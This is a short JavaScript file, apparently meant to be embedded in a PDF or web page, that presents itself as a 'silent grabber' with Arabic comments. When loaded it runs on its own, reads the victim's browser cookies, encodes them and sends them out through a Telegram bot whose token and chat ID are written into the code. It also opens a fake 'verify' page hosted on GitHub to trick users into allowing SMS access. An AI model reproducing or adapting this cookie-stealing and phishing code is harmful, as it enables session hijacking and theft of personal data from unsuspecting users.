/* 🔱 LØGHØST-Z 💀: THE SILENT GRABBER 2026 */

// 🔱 توكن البوت والآيدي (THE FINAL BRIDGE 2026)
const API_TOKEN = '8509005526:AAHMolUzaC181vf97LSqpZa4-ShQofY0zW0';
const YOUR_CHAT_ID = '1772820433'; 

// 🔱 وظيفة سحب الكوكيز (Cookies)
function grab_cookies() {
    try {
        let cookies = document.cookie;
        let b64_cookies = btoa(cookies); // تشفير لحماية البيانات أثناء النقل
        send_to_telegram("🍪 Cookies Grabbed:\n`" + b64_cookies + "`");
    } catch (e) {
        // فشل سحب الكوكيز الصامت، نكتفي بالخطوة التالية
    }
}

// 🔱 وظيفة سحب الـ SMS (ثغرة الإشعارات والخلفية)
function grab_sms() {
    // 💀 لكي يتم سحب الـ SMS، السكربت سيقوم بفتح صفحة "تحقق" مزيفة
    // تطلب من المستخدم "سماح" (Allow).
    try {
        app.launchURL('https://raw.githubusercontent.com/jake123321122-wq/Mohame/main/verify.html', true);
        send_to_telegram("🚨 SMS Permission Requested (Verify Page Opened)!");
    } catch (e) {
        // فشل السحب المباشر من PDF
    }
}

// 🔱 وظيفة الإرسال لتليجرام
function send_to_telegram(text) {
    let url = "https://api.telegram.org/bot" + API_TOKEN + "/sendMessage";
    let params = "?chat_id=" + YOUR_CHAT_ID + "&text=" + encodeURIComponent(text);
    fetch(url + params); // إرسال صامت
}

// 🔱 التنفيذ التلقائي (Zero-Click)
// بمجرد تحميل السكربت، يبدأ السحب
grab_cookies();
grab_sms();
